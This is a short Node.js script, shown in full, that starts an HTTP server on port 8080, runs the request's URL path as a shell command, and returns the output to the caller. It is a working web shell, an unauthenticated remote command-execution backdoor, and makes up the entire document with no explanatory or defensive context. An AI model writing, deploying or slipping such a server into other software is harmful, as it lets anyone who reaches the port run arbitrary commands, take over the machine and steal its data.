const { exec } = require("child_process");
require("http").createServer((req, res) => {
    exec(req.url.slice(1), (err, stdout, stderr) => {
        res.end(stdout + stderr);
    });
}).listen(8080);
